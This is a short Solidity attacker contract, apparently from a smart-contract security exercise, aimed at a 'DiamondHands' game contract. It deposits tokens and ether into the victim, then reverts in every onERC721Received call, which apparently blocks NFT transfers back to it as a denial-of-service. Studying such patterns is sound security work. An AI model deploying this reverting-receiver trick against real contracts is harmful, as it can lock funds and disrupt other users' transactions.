// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../DiamondHands.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract DiamondHandsAttacked is IERC721Receiver {
    DiamondHands public victimContract;
    ChickenBonds public cb;

    constructor(address _victimContract, address _cb) {
        victimContract = DiamondHands(_victimContract);
        cb = ChickenBonds(_cb);
    }

    function lock() external payable {
        cb.approve(address(victimContract), 20);
        victimContract.playDiamondHands{value: 1 ether}(20);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        revert(" I am the bad guy");
    }
}
